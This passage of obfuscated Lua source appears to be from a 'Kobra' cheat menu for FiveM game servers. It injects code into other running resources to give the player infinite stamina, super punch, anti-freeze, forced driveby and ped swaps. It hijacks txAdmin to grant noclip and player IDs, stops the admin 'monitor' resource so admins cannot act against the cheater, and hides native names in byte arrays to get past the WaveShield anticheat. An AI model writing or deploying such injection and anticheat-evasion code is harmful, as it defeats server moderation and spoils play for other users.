                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
                                            hNative("ClearPedTasks", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsEntityPositionFrozen", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                            if antiFreezeEnabled == nil then antiFreezeEnabled = false end
                                            antiFreezeEnabled = true

                                            local function startAntiFreeze()
                                                local create = CreateThread
                                                local wait = Wait
                                                local pedId = PlayerPedId
                                                local isFrozen = IsEntityPositionFrozen
                                                local unfreeze = FreezeEntityPosition
                                                local clear = ClearPedTasks

                                                create(function()
                                                    while antiFreezeEnabled and not Unloaded do
                                                        local ped = pedId()
                                                        if ped and ped ~= 0 and isFrozen(ped) then
                                                            unfreeze(ped, false)
                                                            clear(ped)
                                                        end
                                                        wait(0)
                                                    end
                                                end)
                                            end

                                            startAntiFreeze()
                                        ]]);v0:Notify("success","Kobra","Anti-Freeze Enabled (Fallback)",250 + 2750 );end elseif v341 then local v944=0;while true do if (v944==(0 + 0)) then v0:Notify("error","Kobra","Anti-Freeze Disabled",4667 -(586 + 1081) );v36(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            antiFreezeEnabled = false
                                        ]]);break;end end else local v945=0;while true do if (v945==0) then v36(v342,[[
                                            antiFreezeEnabled = false
                                        ]]);v0:Notify("error","Kobra","Anti-Freeze Disabled (Fallback)",3000);break;end end end break;end if (v340==(511 -(348 + 163))) then v341=GetResourceState("WaveShield")=="started" ;v342=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;v340=1;end end end},{type="checkbox",label="Force Third Person",checked=false,desc="This will force third person.",onSelect=function(v343) if v343 then v36(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[


                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetFollowVehicleCamViewMode", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetFollowPedCamViewMode", function(originalFn, ...) return originalFn(...) end)

                                if kJfGhTrEeWqAsDz == nil then kJfGhTrEeWqAsDz = false end
                                kJfGhTrEeWqAsDz = true

                                local function pqkTRWZ38y()
                                    local gKdNqLpYxMiV = CreateThread
                                    gKdNqLpYxMiV(function()
                                        while kJfGhTrEeWqAsDz and not Unloaded do
                                            local qWeRtYuIoPlMnBv = SetFollowPedCamViewMode
                                            local aSdFgHjKlQwErTy = SetFollowVehicleCamViewMode

                                            qWeRtYuIoPlMnBv(0)
                                            aSdFgHjKlQwErTy(0)
                                            Wait(0)
                                        end
                                    end)
                                end

                                pqkTRWZ38y()
                                ]]);else v36(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[

                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetFollowVehicleCamViewMode", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetFollowPedCamViewMode", function(originalFn, ...) return originalFn(...) end)

                                kJfGhTrEeWqAsDz = false
                                ]]);end end},{type="checkbox",label="Force Driveby",checked=false,desc="This will enable driveby if disabled.",onSelect=function(v344) if v344 then v36(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[


                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetPlayerCanDoDriveBy", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                if zXcVbNmQwErTyUi == nil then zXcVbNmQwErTyUi = false end
                                zXcVbNmQwErTyUi = true

                                local function UEvLBcXqM6()
                                    local cVbNmAsDfGhJkLz = CreateThread
                                    cVbNmAsDfGhJkLz(function()
                                        while zXcVbNmQwErTyUi and not Unloaded do
                                            local lKjHgFdSaZxCvBn = SetPlayerCanDoDriveBy
                                            local eRtYuIoPaSdFgHi = PlayerPedId()

                                            lKjHgFdSaZxCvBn(eRtYuIoPaSdFgHi, true)
                                            Wait(0)
                                        end
                                    end)
                                end

                                UEvLBcXqM6()
                                ]]);else v36(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[

                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetPlayerCanDoDriveBy", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                zXcVbNmQwErTyUi = false
                                ]]);end end},{type="checkbox",label="Infinite Stamina",checked=false,desc="This will enable Infinite Stamina.",onSelect=function(v345) if v345 then local v547=0;while true do if (v547==0) then v0:Notify("success","Kobra","Infinite Stamina On",4859 -(1541 + 318) );if (GetResourceState("WaveShield")=="started") then v36(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            if not _G.infiniteStaminaEnabled then
                                                _G.infiniteStaminaEnabled = true

                                                local GetPlayerId_fn      = g({80,108,97,121,101,114,73,100})
                                                local RestoreStamina_fn   = g({82,101,115,116,111,114,101,80,108,97,121,101,114,83,116,97,109,105,110,97})
                                                local Wait_fn             = g({87,97,105,116})

                                                local function initFlow(cb)
                                                    local co = coroutine.create(cb)
                                                    local function execCycle()
                                                        while coroutine.status(co) ~= "dead" do
                                                            local ok, err = coroutine.resume(co)
                                                            if not ok then
                                                                print("^1[InfiniteStamina] Coroutine error:^7", err)
                                                                break
                                                            end
                                                            Wait_fn(0)
                                                        end
                                                    end
                                                    execCycle()
                                                end

                                                initFlow(function()
                                                    while _G.infiniteStaminaEnabled do
                                                        local pid = GetPlayerId_fn()
                                                        if pid then
                                                            RestoreStamina_fn(pid, 1.0)
                                                        end
                                                        Wait_fn(0)
                                                    end
                                                end)
                                            end
                                        ]]);else MachoInjectResourceRaw("any",[[
                                            if _G.staminaThreadActive == nil then _G.staminaThreadActive = false end
                                            if _G.infiniteStaminaEnabled == nil then
                                                _G.infiniteStaminaEnabled = true

                                                local function ThreadStart()
                                                    local CreateThread_fn = CreateThread
                                                    local Wait_fn         = Wait
                                                    local PlayerId_fn     = PlayerId
                                                    local Restore_fn      = RestorePlayerStamina

                                                    CreateThread_fn(function()
                                                        while true do
                                                            Wait_fn(0)
                                                            if not _G.infiniteStaminaEnabled then
                                                                Wait_fn(500)
                                                                goto continue
                                                            end

                                                            local pid = PlayerId_fn()
                                                            if pid then
                                                                Restore_fn(pid, 1.0)
                                                            end

                                                            ::continue::
                                                        end
                                                    end)
                                                end

                                                ThreadStart()
                                            end
                                            _G.infiniteStaminaEnabled = true
                                        ]]);end break;end end else local v548=0;while true do if (v548==(0 + 0)) then v0:Notify("error","Kobra","Infinite Stamina Off",1517 + 1483 );if (GetResourceState("WaveShield")=="started") then v36(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            _G.infiniteStaminaEnabled = false
                                        ]]);else MachoInjectResourceRaw("any",[[
                                            _G.infiniteStaminaEnabled = false
                                        ]]);end break;end end end end},{type="checkbox",label="Tiny Ped",checked=false,desc="This will turn you into a tiny ped.",onSelect=function(v346) local v347=0 + 0 ;local v348;while true do if (v347==(1750 -(1036 + 714))) then v348=((GetResourceState("WaveShield")=="started") and "WaveShield") or ((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;if v346 then v36(v348,[[
                                        if not _G.KobraTinyPedInjected then
                                            _G.KobraTinyPedInjected = true
                                            _G.KobraTinyPedEnabled = true

                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then
                                                    return
                                                end
                                                _G[nativeName] = function(...)
                                                    return newFunction(originalNative, ...)
                                                end
                                            end

                                            hNative("SetPedConfigFlag", function(originalFn, ...) return originalFn(...) end)

                                            -- One-shot initflow (no looping)
                                            function initflow(name, fn)
                                                if not _G.__flows then _G.__flows = {} end
                                                if _G.__flows[name] then
                                                    _G.__flows[name].active = false
                                                end
                                                local flow = { active = true }
                                                _G.__flows[name] = flow

                                                SetTimeout(0, function()
                                                    if flow.active then
                                                        fn()
                                                    end
                                                end)
                                            end
                                        else
                                            _G.KobraTinyPedEnabled = true
                                        end

                                        initflow("TinyPedOnce", function()
                                            local ped = PlayerPedId()
                                            if ped and ped ~= 0 then
                                                SetPedConfigFlag(ped, 223, true)
                                            end
                                        end)
                                    ]]);else v36(v348,[[
                                        _G.KobraTinyPedEnabled = false
                                        local ped = PlayerPedId()
                                        if ped and ped ~= 0 then
                                            SetPedConfigFlag(ped, 223, false)
                                        end
                                    ]]);end break;end end end},{type="checkbox",label="Super Punch",checked=false,onSelect=function(v349) local v350=0 + 0 ;local v351;local v352;while true do if (v350==(1281 -(883 + 397))) then if v349 then if v351 then local v946=590 -(563 + 27) ;while true do if (v946==0) then v0:Notify("success","Kobra","Super Punch Enabled",3000);v36(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if superPunchEnabled == nil then superPunchEnabled = false end
                                            superPunchEnabled = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local setMeleeMod = SetPlayerMeleeWeaponDamageModifier
                                                local setVehicleMod = SetPlayerVehicleDamageModifier
                                                local setWeaponMod = SetWeaponDamageModifier
                                                local playerId = PlayerId
                                                local unarmedHash = GetHashKey("WEAPON_UNARMED")
                                                local damageValue = 150.0

                                                while superPunchEnabled and not Unloaded do
                                                    Wait(0)
                                                    local pid = playerId()
                                                    setMeleeMod(pid, damageValue)
                                                    setVehicleMod(pid, damageValue)
                                                    setWeaponMod(unarmedHash, damageValue)
                                                end

                                                -- Restore on disable
                                                local pid = playerId()
                                                setMeleeMod(pid, 1.0)
                                                setVehicleMod(pid, 1.0)
                                                setWeaponMod(unarmedHash, 1.0)
                                            end)
                                        ]]);break;end end else local v947=0 -0 ;while true do if ((1986 -(1369 + 617))==v947) then v36(v352,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPlayerMeleeWeaponDamageModifier", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPlayerVehicleDamageModifier", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetWeaponDamageModifier", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerId", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)

                                            if superPunchEnabled == nil then superPunchEnabled = false end
                                            superPunchEnabled = true

                                            local function startSuperPunch()
                                                local create = CreateThread
                                                local wait = Wait
                                                local setMelee = SetPlayerMeleeWeaponDamageModifier
                                                local setVehicle = SetPlayerVehicleDamageModifier
                                                local setWeapon = SetWeaponDamageModifier
                                                local getPlayer = PlayerId
                                                local hashKey = GetHashKey

                                                create(function()
                                                    local unarmedHash = hashKey("WEAPON_UNARMED")
                                                    local damageValue = 150.0

                                                    while superPunchEnabled and not Unloaded do
                                                        local pid = getPlayer()
                                                        setMelee(pid, damageValue)
                                                        setVehicle(pid, damageValue)
                                                        setWeapon(unarmedHash, damageValue)
                                                        wait(0)
                                                    end

                                                    -- Restore
                                                    local pid = getPlayer()
                                                    setMelee(pid, 1.0)
                                                    setVehicle(pid, 1.0)
                                                    setWeapon(unarmedHash, 1.0)
                                                end)
                                            end

                                            startSuperPunch()
                                        ]]);v0:Notify("success","Kobra","Super Punch Enabled (Fallback)",3000);break;end end end elseif v351 then local v948=1487 -(85 + 1402) ;while true do if (v948==0) then v0:Notify("error","Kobra","Super Punch Disabled",1035 + 1965 );v36(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            superPunchEnabled = false
                                        ]]);break;end end else local v949=0 -0 ;while true do if (v949==0) then v36(v352,[[
                                            superPunchEnabled = false
                                        ]]);v0:Notify("error","Kobra","Super Punch Disabled (Fallback)",3403 -(274 + 129) );break;end end end break;end if (v350==(217 -(12 + 205))) then v351=GetResourceState("WaveShield")=="started" ;v352=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;v350=1;end end end},{type="divider",label="txAdmin Options"},{type="checkbox",label="txAdmin Player IDs",checked=false,desc="This will toggle txAdmin Player ids.",onSelect=function(v353) if v353 then MachoInjectResource2(AsThreadNs,"monitor",[[
                                menuIsAccessible = true
                                toggleShowPlayerIDs(true, true)
                                ]]);else MachoInjectResource2(AsThreadNs,"monitor",[[
                                menuIsAccessible = true
                                toggleShowPlayerIDs(false, true)
                                ]]);end end},{type="checkbox",label="txAdmin Noclip",checked=false,desc="This will toggle txAdmin noclip.",onSelect=function(v354) if v354 then if (GetResourceState("WaveShield")=="started") then TriggerEvent("txcl:setPlayerMode","noclip",true);else MachoInjectResource2(3 + 0 ,"monitor",[[
                                            menuIsAccessible = true
                                            toggleShowPlayerIDs(true, true)
                                        ]]);end elseif (GetResourceState("WaveShield")=="started") then TriggerEvent("txcl:setPlayerMode","none",true);else MachoInjectResource2(387 -(27 + 357) ,"monitor",[[
                                            menuIsAccessible = true
                                            toggleShowPlayerIDs(false, true)
                                        ]]);end end},{type="checkbox",label="Disable All txAdmin",checked=false,desc="This will disable txAdmin options from admins using them against you.",onSelect=function(v355) if v355 then local v549=297 -(90 + 207) ;while true do if (0==v549) then MachoResourceStop("monitor");print("started");break;end end else local v550=0 + 0 ;while true do if (v550==0) then print("stopped");MachoResourceStart("monitor");break;end end end end},{type="checkbox",label="Disable txAdmin Teleport",checked=false,desc="This will disable txAdmin Teleport.",onSelect=function(v356) if v356 then local v551=1795 -(730 + 1065) ;while true do if ((1563 -(1339 + 224))==v551) then MachoResourceStop("monitor");print("started");break;end end else local v552=0;while true do if (0==v552) then print("stopped");MachoResourceStart("monitor");break;end end end end},{type="checkbox",label="Disable txAdmin Freeze",checked=false,desc="This will disable txAdmin Freeze.",onSelect=function(v357) if v357 then local v553=0;while true do if (v553==(0 + 0)) then MachoResourceStop("monitor");print("started");break;end end else local v554=0 -0 ;while true do if (v554==(843 -(268 + 575))) then print("stopped");MachoResourceStart("monitor");break;end end end end}}},{label="Wardrobe",tabs={{icon="",type="scrollable",value=2 -1 ,values={"Random"},label="Outfit",desc="Apply a preset outfit",onSelect=function(v358) if (v358=="Random") then v36("any",[[
                                        local function UxrKYLp378()
                                            local UwEsDxCfVbGtHy = PlayerPedId
                                            local FdSaQwErTyUiOp = GetNumberOfPedDrawableVariations
                                            local QwAzXsEdCrVfBg = SetPedComponentVariation
                                            local LkJhGfDsAqWeRt = SetPedHeadBlendData
                                            local MnBgVfCdXsZaQw = SetPedHairColor
                                            local RtYuIoPlMnBvCx = GetNumHeadOverlayValues
                                            local TyUiOpAsDfGhJk = SetPedHeadOverlay
                                            local ErTyUiOpAsDfGh = SetPedHeadOverlayColor
                                            local DfGhJkLzXcVbNm = ClearPedProp

                                            local function PqLoMzNkXjWvRu(component, exclude)
                                                local ped = UwEsDxCfVbGtHy()
                                                local total = FdSaQwErTyUiOp(ped, component)
                                                if total <= 1 then return 0 end
                                                local choice = exclude
                                                while choice == exclude do
                                                    choice = math.random(0, total - 1)
                                                end
                                                return choice
                                            end

                                            local function OxVnBmCxZaSqWe(component)
                                                local ped = UwEsDxCfVbGtHy()
                                                local total = FdSaQwErTyUiOp(ped, component)
                                                return total > 1 and math.random(0, total - 1) or 0
                                            end

                                            local ped = UwEsDxCfVbGtHy()

                                            QwAzXsEdCrVfBg(ped, 11, PqLoMzNkXjWvRu(11, 15), 0, 2)
                                            QwAzXsEdCrVfBg(ped, 6, PqLoMzNkXjWvRu(6, 15), 0, 2)
                                            QwAzXsEdCrVfBg(ped, 8, 15, 0, 2)
                                            QwAzXsEdCrVfBg(ped, 3, 0, 0, 2)
                                            QwAzXsEdCrVfBg(ped, 4, OxVnBmCxZaSqWe(4), 0, 2)

                                            local face = math.random(0, 45)
                                            local skin = math.random(0, 45)
                                            LkJhGfDsAqWeRt(ped, face, skin, 0, face, skin, 0, 1.0, 1.0, 0.0, false)

                                            local hairMax = FdSaQwErTyUiOp(ped, 2)
                                            local hair = hairMax > 1 and math.random(0, hairMax - 1) or 0
                                            QwAzXsEdCrVfBg(ped, 2, hair, 0, 2)
                                            MnBgVfCdXsZaQw(ped, 0, 0)

                                            local brows = RtYuIoPlMnBvCx(2)
                                            TyUiOpAsDfGhJk(ped, 2, brows > 1 and math.random(0, brows - 1) or 0, 1.0)
                                            ErTyUiOpAsDfGh(ped, 2, 1, 0, 0)

                                            DfGhJkLzXcVbNm(ped, 0)
                                            DfGhJkLzXcVbNm(ped, 1)
                                        end

                                        UxrKYLp378()
                                    ]]);end end},{type="divider",label="Ped Options"},{type="scrollable",label="Freemode",scrollType="onEnter",value=1 + 0 ,values={"Freemode Male","Freemode Female"},onSelect=function(v359) MachoInjectResourceRaw("any",([[
                                    local selected = "%s"
                                    local pedModel = nil

                                    if selected == "Freemode Male" then pedModel = "mp_m_freemode_01"
                                    elseif selected == "Freemode Female" then pedModel = "mp_f_freemode_01"
                                    end

                                    if pedModel then
                                        local modelHash = GetHashKey(pedModel)
                                        RequestModel(modelHash)
                                        while not HasModelLoaded(modelHash) do
                                            Wait(0)
                                        end

                                        SetPlayerModel(PlayerId(), modelHash)
                                        SetModelAsNoLongerNeeded(modelHash)

                                        local playerPed = PlayerPedId()
                                        SetPedDefaultComponentVariation(playerPed)
                                        SetPedRandomComponentVariation(playerPed, true)
                                        SetPedRandomProps(playerPed)
                                        SetEntityInvincible(playerPed, false)
                                        ClearPedTasksImmediately(playerPed)

                                        print("Changed ped to: " .. pedModel)
                                    else
                                        print("Invalid ped selected: " .. tostring(selected))
                                    end
                                ]]):format(v359));end},{type="scrollable",label="Peds",scrollType="onEnter",value=1 + 0 ,values={"Michael","Franklin","Trevor","Lamar","Jimmy","Amanda","Tracey","Ron","Wade","Dave Norton","Steve Haines","Devin Weston","Floyd","Chef","Lester","Chop","Brad","Police Officer Male","Police Officer Female","SWAT","Sheriff Male","Sheriff Female","Highway Cop","FIB Male","FIB Female","Paramedic","Firefighter","Doctor","Construction Worker","Pilot Male","Pilot Female","Business Male","Business Female","Street Dealer","Gang Male 1","Gang Male 2","Gang Female 1","Ballas 1","Ballas 2","Ballas Female","Families 1","Families 2","Vagos 1","Vagos 2","Lost MC 1","Lost MC 2","Lost MC Female","Army Soldier","Marine 1","Marine 2","Prisoner Male","Prison Guard","Cop Undercover","Security Guard","Janitor","Hobo Male","Hobo Female","Prostitute 1","Prostitute 2","Beach Male","Beach Female","Tourist Male","Tourist Female","Skater","Hipster Male","Hipster Female","Bouncer","Shopkeeper","Chef","Bartender","Waiter","Mechanic","Taxi Driver","Gardener","Farmer","Dock Worker","Trash Worker","Postal Worker","Bus Driver","Pilot","Air Hostess","Cop Traffic","Cop Detective","Agent","Reporter","News Cameraman","Hunter","Hiker Male","Hiker Female","Golfer Male","Golfer Female","Tennis Player Male","Tennis Player Female"},onSelect=function(v360) MachoInjectResourceRaw("any",([[
                                    local selected = "%s"
                                    local pedModel = nil

                                    if selected == "Michael" then pedModel = "player_zero"
                                    elseif selected == "Franklin" then pedModel = "player_one"
                                    elseif selected == "Trevor" then pedModel = "player_two"
                                    elseif selected == "Lamar" then pedModel = "ig_lamardavis"
                                    elseif selected == "Jimmy" then pedModel = "ig_jimmydisanto"
                                    elseif selected == "Amanda" then pedModel = "ig_amandatownley"
                                    elseif selected == "Tracey" then pedModel = "ig_tracydisanto"
                                    elseif selected == "Ron" then pedModel = "ig_ronsch"
                                    elseif selected == "Wade" then pedModel = "ig_wade"
                                    elseif selected == "Dave Norton" then pedModel = "ig_davenorton"
                                    elseif selected == "Steve Haines" then pedModel = "ig_stevehains"
                                    elseif selected == "Devin Weston" then pedModel = "ig_devin"
                                    elseif selected == "Floyd" then pedModel = "ig_floyd"
                                    elseif selected == "Chef" then pedModel = "ig_chef"
                                    elseif selected == "Lester" then pedModel = "ig_lestercrest"
                                    elseif selected == "Chop" then pedModel = "a_c_chop"
                                    elseif selected == "Brad" then pedModel = "ig_brad"
                                    elseif selected == "Police Officer Male" then pedModel = "s_m_y_cop_01"
                                    elseif selected == "Police Officer Female" then pedModel = "s_f_y_cop_01"
                                    elseif selected == "SWAT" then pedModel = "s_m_y_swat_01"
                                    elseif selected == "Sheriff Male" then pedModel = "s_m_y_sheriff_01"
                                    elseif selected == "Sheriff Female" then pedModel = "s_f_y_sheriff_01"
                                    elseif selected == "Highway Cop" then pedModel = "s_m_y_hwaycop_01"
                                    elseif selected == "FIB Male" then pedModel = "s_m_m_fibsec_01"
                                    elseif selected == "FIB Female" then pedModel = "s_f_m_fiboffice_02"
                                    elseif selected == "Paramedic" then pedModel = "s_m_m_paramedic_01"
                                    elseif selected == "Firefighter" then pedModel = "s_m_y_fireman_01"
                                    elseif selected == "Doctor" then pedModel = "s_m_m_doctor_01"
                                    elseif selected == "Construction Worker" then pedModel = "s_m_y_construct_01"
                                    elseif selected == "Pilot Male" then pedModel = "s_m_m_pilot_02"
                                    elseif selected == "Pilot Female" then pedModel = "s_f_y_airhostess_01"
                                    elseif selected == "Business Male" then pedModel = "s_m_y_business_01"
                                    elseif selected == "Business Female" then pedModel = "s_f_y_business_01"
                                    elseif selected == "Street Dealer" then pedModel = "g_m_y_mexgoon_02"
                                    elseif selected == "Gang Male 1" then pedModel = "g_m_y_ballaorig_01"
                                    elseif selected == "Gang Male 2" then pedModel = "g_m_y_ballasout_01"
                                    elseif selected == "Gang Female 1" then pedModel = "g_f_y_ballas_01"
                                    elseif selected == "Ballas 1" then pedModel = "g_m_y_ballaeast_01"
                                    elseif selected == "Ballas 2" then pedModel = "g_m_y_ballasout_01"
                                    elseif selected == "Ballas Female" then pedModel = "g_f_y_ballas_01"
                                    elseif selected == "Families 1" then pedModel = "g_m_y_famca_01"
                                    elseif selected == "Families 2" then pedModel = "g_m_y_famdnf_01"
                                    elseif selected == "Vagos 1" then pedModel = "g_m_y_mexgoon_01"
                                    elseif selected == "Vagos 2" then pedModel = "g_m_y_mexgoon_03"
                                    elseif selected == "Lost MC 1" then pedModel = "g_m_y_lost_01"
                                    elseif selected == "Lost MC 2" then pedModel = "g_m_y_lost_02"
                                    elseif selected == "Lost MC Female" then pedModel = "g_f_y_lost_01"
                                    elseif selected == "Army Soldier" then pedModel = "s_m_y_marine_01"
                                    elseif selected == "Marine 1" then pedModel = "s_m_y_marine_02"
                                    elseif selected == "Marine 2" then pedModel = "s_m_y_marine_03"
                                    elseif selected == "Prisoner Male" then pedModel = "s_m_y_prismuscl_01"
                                    elseif selected == "Prison Guard" then pedModel = "s_m_m_prisguard_01"
                                    elseif selected == "Cop Undercover" then pedModel = "s_m_m_ciasec_01"
                                    elseif selected == "Security Guard" then pedModel = "s_m_m_security_01"
                                    elseif selected == "Janitor" then pedModel = "s_m_m_janitor"
                                    elseif selected == "Hobo Male" then pedModel = "a_m_m_tramp_01"
                                    elseif selected == "Hobo Female" then pedModel = "a_f_m_tramp_01"
                                    elseif selected == "Prostitute 1" then pedModel = "s_f_y_hooker_01"
                                    elseif selected == "Prostitute 2" then pedModel = "s_f_y_hooker_02"
                                    elseif selected == "Beach Male" then pedModel = "a_m_y_beach_01"
                                    elseif selected == "Beach Female" then pedModel = "a_f_y_beach_01"
                                    elseif selected == "Tourist Male" then pedModel = "a_m_y_tourist_01"
                                    elseif selected == "Tourist Female" then pedModel = "a_f_y_tourist_01"
                                    elseif selected == "Skater" then pedModel = "a_m_y_skater_01"
                                    elseif selected == "Hipster Male" then pedModel = "a_m_y_hipster_01"
                                    elseif selected == "Hipster Female" then pedModel = "a_f_y_hipster_01"
                                    elseif selected == "Bouncer" then pedModel = "s_m_m_bouncer_01"
                                    elseif selected == "Shopkeeper" then pedModel = "mp_m_shopkeep_01"
                                    elseif selected == "Chef" then pedModel = "s_m_y_chef_01"
                                    elseif selected == "Bartender" then pedModel = "s_m_y_barman_01"
                                    elseif selected == "Waiter" then pedModel = "s_m_y_waiter_01"
                                    elseif selected == "Mechanic" then pedModel = "s_m_y_xmech_02"
                                    elseif selected == "Taxi Driver" then pedModel = "s_m_m_trucker_01"
                                    elseif selected == "Gardener" then pedModel = "s_m_m_gardener_01"
                                    elseif selected == "Farmer" then pedModel = "a_m_m_farmer_01"
                                    elseif selected == "Dock Worker" then pedModel = "s_m_y_dockwork_01"
                                    elseif selected == "Trash Worker" then pedModel = "s_m_y_garbage"
                                    elseif selected == "Postal Worker" then pedModel = "s_m_m_postal_01"
                                    elseif selected == "Bus Driver" then pedModel = "s_m_o_busker_01"
                                    elseif selected == "Pilot" then pedModel = "s_m_m_pilot_01"
                                    elseif selected == "Air Hostess" then pedModel = "s_f_y_airhostess_01"
                                    elseif selected == "Cop Traffic" then pedModel = "s_m_y_hwaycop_01"
                                    elseif selected == "Cop Detective" then pedModel = "s_m_m_ciasec_01"
                                    elseif selected == "Agent" then pedModel = "s_m_m_fiboffice_02"
                                    elseif selected == "Reporter" then pedModel = "s_f_y_scrubs_01"
                                    elseif selected == "News Cameraman" then pedModel = "s_m_m_pilot_02"
                                    elseif selected == "Hunter" then pedModel = "a_m_m_hillbilly_02"
                                    elseif selected == "Hiker Male" then pedModel = "a_m_m_hiker_01"
                                    elseif selected == "Hiker Female" then pedModel = "a_f_m_hiker_01"
                                    elseif selected == "Golfer Male" then pedModel = "a_m_m_golfer_01"
                                    elseif selected == "Golfer Female" then pedModel = "a_f_m_golfer_01"
                                    elseif selected == "Tennis Player Male" then pedModel = "a_m_m_tennis_01"
                                    elseif selected == "Tennis Player Female" then pedModel = "a_f_m_tennis_01"
                                    end

                                    if pedModel then
                                        local modelHash = GetHashKey(pedModel)
                                        RequestModel(modelHash)
                                        while not HasModelLoaded(modelHash) do
                                            Wait(0)
                                        end

                                        SetPlayerModel(PlayerId(), modelHash)
                                        SetModelAsNoLongerNeeded(modelHash)

                                        local playerPed = PlayerPedId()
                                        SetPedDefaultComponentVariation(playerPed)
                                        SetPedRandomComponentVariation(playerPed, true)
                                        SetPedRandomProps(playerPed)
                                        SetEntityInvincible(playerPed, false)
                                        ClearPedTasksImmediately(playerPed)

                                        print("Changed ped to: " .. pedModel)
                                    else
                                        print("Invalid ped selected: " .. tostring(selected))
                                    end
                                ]]):format(v360));end},{type="scrollable",label="Animal Peds",scrollType="onEnter",value=960 -(114 + 845) ,values={"Boar","Cat","Chicken","Chimp","Cow","Coyote","Crow","Deer","Dolphin","Fish","Hen","Humpback","Husky","Killer Whale","Mountain Lion","Pig","Pigeon","Poodle","Pug","Poodle","Rabbit","Rat","Retriever","Rhesus Monkey","Rottweiler","Seagull","Shepherd","Stingray","Tiger Shark","Hammerhead Shark","Cow","Cat2","Chickenhawk","Cormorant","Coyote2","Chimp2","Boar2","Deer2","Fish2","Husky2","Pug2","Poodle2","Retriever2","Shepherd2","Rat2","Rabbit2","Dolphin2","Killer Whale2","Mountain Lion2","Pig2","Seagull2","Stingray2","Tiger Shark2","Hammerhead Shark2"},onSelect=function(v361) MachoInjectResourceRaw("any",([[
                                    local selected = "%s"
                                    local pedModel = nil

                                    if selected == "Boar" then
                                        pedModel = "a_c_boar"
                                    elseif selected == "Cat" then
                                        pedModel = "a_c_cat_01"
                                    elseif selected == "Chicken" then
                                        pedModel = "a_c_hen"
                                    elseif selected == "Chimp" then
                                        pedModel = "a_c_chimp"
                                    elseif selected == "Cow" then
                                        pedModel = "a_c_cow"
                                    elseif selected == "Coyote" then
